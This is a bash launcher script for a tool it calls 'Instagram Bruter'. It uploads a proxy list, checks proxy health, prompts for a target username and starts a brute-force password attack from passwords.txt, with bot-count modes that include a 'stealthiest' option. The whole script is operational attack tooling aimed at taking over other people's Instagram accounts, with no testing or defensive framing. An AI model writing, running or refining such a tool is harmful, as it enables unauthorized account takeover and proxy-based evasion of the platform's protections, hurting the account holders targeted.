#!/bin/bash

# Instagram Bruter - Quick Start Script
# Automates: Proxy Upload → Health Check → Start Testing

echo "=========================================="
echo "Instagram Bruter - Quick Start"
echo "=========================================="
echo ""

# Step 1: Upload proxy list to database
echo "[1/3] Uploading proxy list to database..."
pipenv run python instagram.py -px proxies.txt
if [ $? -ne 0 ]; then
    echo "✗ Failed to upload proxies"
    exit 1
fi
echo ""

# Step 2: Check proxy health
echo "[2/3] Checking proxy health..."
pipenv run python instagram.py --stats
if [ $? -ne 0 ]; then
    echo "✗ Failed to get proxy stats"
    exit 1
fi
echo ""

# Step 3: Start testing
echo "[3/3] Starting brute force attack..."
echo ""
echo "Enter target username (or email):"
read -p "Username: " username

if [ -z "$username" ]; then
    echo "✗ Username cannot be empty"
    exit 1
fi

echo ""
echo "Starting attack on: $username"
echo "Password list: passwords.txt"
echo ""
echo "Mode options:"
echo "  0 = 32 bots (fastest)"
echo "  1 = 16 bots"
echo "  2 = 8 bots (default, balanced)"
echo "  3 = 4 bots (slowest, stealthiest)"
echo ""
read -p "Select mode [0-3] (default: 2): " mode
mode=${mode:-2}

echo ""
echo "Starting attack..."
echo "Press Ctrl+C to stop"
echo ""

pipenv run python instagram.py -u "$username" -p passwords.txt -m "$mode"

echo ""
echo "=========================================="
echo "Attack completed or stopped"
echo "=========================================="
echo ""
